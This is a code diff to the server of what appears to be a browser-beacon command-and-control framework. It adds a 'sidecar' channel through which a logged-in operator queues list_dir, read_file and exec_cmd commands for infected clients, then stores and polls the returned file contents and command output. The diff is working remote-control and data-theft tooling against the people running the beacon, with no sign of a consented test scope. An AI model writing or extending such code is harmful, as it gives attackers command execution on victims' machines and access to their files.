@@ -287,6 +287,7 @@ class Client(Base):
     receiveKey      = Column(String(44), nullable=True)
     sendKey         = Column(String(44), nullable=True)
     cryptoActive    = Column(Boolean, nullable=False, default=False) # Client confirmed it can use keys (HTTPS)
+    sidecarAvailable = Column(Boolean, nullable=False, default=False) # Sidecar native messaging host connected
 
     def update(self):
         # logger.info("$$ Client Update func")
@@ -555,6 +556,22 @@ class BeaconInjection(Base):
 
     def __repr__(self):
         return f'<BeaconInjection {self.id}>'
+
+
+class SidecarResult(Base):
+    __tablename__ = 'sidecarresults'
+
+    id         = Column(Integer, primary_key=True)
+    clientID   = Column(String(100), nullable=False)  # beacon UUID
+    requestId  = Column(String(100), nullable=False)
+    command    = Column(String(50), nullable=False)    # list_dir, read_file, exec_cmd
+    success    = Column(Boolean, nullable=False)
+    data       = Column(Text, nullable=True)           # JSON string of result data
+    error      = Column(Text, nullable=True)
+    timeStamp  = Column(DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<SidecarResult {self.id}>'
 
 
 # Application settings
@@ -1568,6 +1585,27 @@ def receiveEncryptedMessage(identifier):
         logger.info("Received encrypted task check request message")
         return createTaskResponse(identifier)
 
+    elif path.decode('utf-8') == "/bex/sidecar/status":
+        logger.info("Received sidecar status update")
+        jsonData = json.loads(message.decode('utf-8'))
+        client = Client.query.filter_by(uuid=identifier).first()
+        if client:
+            client.sidecarAvailable = jsonData.get('available', False)
+            dbCommit()
+
+    elif path.decode('utf-8') == "/bex/sidecar/result":
+        logger.info("Received sidecar command result")
+        jsonData = json.loads(message.decode('utf-8'))
+        newResult = SidecarResult(
+            clientID=identifier,
+            requestId=jsonData.get('requestId', ''),
+            command=jsonData.get('command', ''),
+            success=jsonData.get('success', False),
+            data=json.dumps(jsonData.get('data')) if jsonData.get('data') else None,
+            error=jsonData.get('error')
+        )
+        db_session.add(newResult)
+        dbCommit()
 
     else:
         logger.error("Invalid path in receiveEncryptedMessage")
@@ -1792,6 +1830,93 @@ def getBexInjections(beaconID_raw):
     injections = BeaconInjection.query.filter_by(beaconID=client.uuid, active=True).all()
     data = [{'domain': i.domain, 'tag': i.tag, 'last_success': i.last_success} for i in injections]
     return jsonify(data)
+
+
+# Sidecar API endpoints
+
+@app.route('/api/sidecar/command', methods=['POST'])
+@login_required
+def sendSidecarCommand():
+    """Queue a sidecar command for a beacon to execute."""
+    content = request.json
+    beaconID_raw = content.get('beaconID')
+    command = content.get('command')  # list_dir, read_file, exec_cmd
+    args = content.get('args', {})
+
+    if not command:
+        return "Missing command", 400
+
+    client = Client.query.filter_by(id=beaconID_raw).first()
+    if not client:
+        client = Client.query.filter_by(uuid=beaconID_raw).first()
+    if not client:
+        return "Client not found", 404
+    if not client.sidecarAvailable:
+        return "Sidecar not available for this beacon", 400
+
+    requestId = str(uuid.uuid4())
+
+    taskData = {
+        "type": "SIDECAR_COMMAND",
+        "requestId": requestId,
+        "command": command,
+        "args": args
+    }
+    jsonStr = json.dumps(taskData)
+    encoded = base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8')
+    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=encoded)
+    db_session.add(newJob)
+    dbCommit()
+
+    return jsonify({"requestId": requestId}), 200
+
+
+@app.route('/api/sidecar/results/<beaconID_raw>', methods=['GET'])
+@login_required
+def getSidecarResults(beaconID_raw):
+    """Get sidecar results for a beacon."""
+    client = Client.query.filter_by(id=beaconID_raw).first()
+    if not client:
+        client = Client.query.filter_by(uuid=beaconID_raw).first()
+    if not client:
+        return jsonify([])
+
+    requestId = request.args.get('requestId')
+    query = SidecarResult.query.filter_by(clientID=client.uuid)
+    if requestId:
+        query = query.filter_by(requestId=requestId)
+
+    results = query.order_by(SidecarResult.timeStamp.desc()).limit(50).all()
+    data = [{
+        'id': r.id,
+        'requestId': r.requestId,
+        'command': r.command,
+        'success': r.success,
+        'data': json.loads(r.data) if r.data else None,
+        'error': r.error,
+        'timeStamp': str(r.timeStamp)
+    } for r in results]
+
+    return jsonify(data)
+
+
+@app.route('/api/sidecar/result/<requestId>', methods=['GET'])
+@login_required
+def getSidecarResult(requestId):
+    """Poll for a specific sidecar result by requestId."""
+    result = SidecarResult.query.filter_by(requestId=requestId).first()
+    if not result:
+        return jsonify({"ready": False})
+
+    return jsonify({
+        "ready": True,
+        "id": result.id,
+        "command": result.command,
+        "success": result.success,
+        "data": json.loads(result.data) if result.data else None,
+        "error": result.error,
+        "timeStamp": str(result.timeStamp)
+    })
 
 
 # For use by both normal requests and obfuscated requests
@@ -2528,8 +2653,9 @@ def getClients():
             'platform': escape(client.platform), 
             'browser': escape(client.browser), 
             'isStarred': client.isStarred, 
-            'hasJobs': client.hasJobs, 
-            'fingerprint': client.fingerprint
+            'hasJobs': client.hasJobs,
+            'fingerprint': client.fingerprint,
+            'sidecarAvailable': client.sidecarAvailable
         })
 
     return jsonify(allClients)
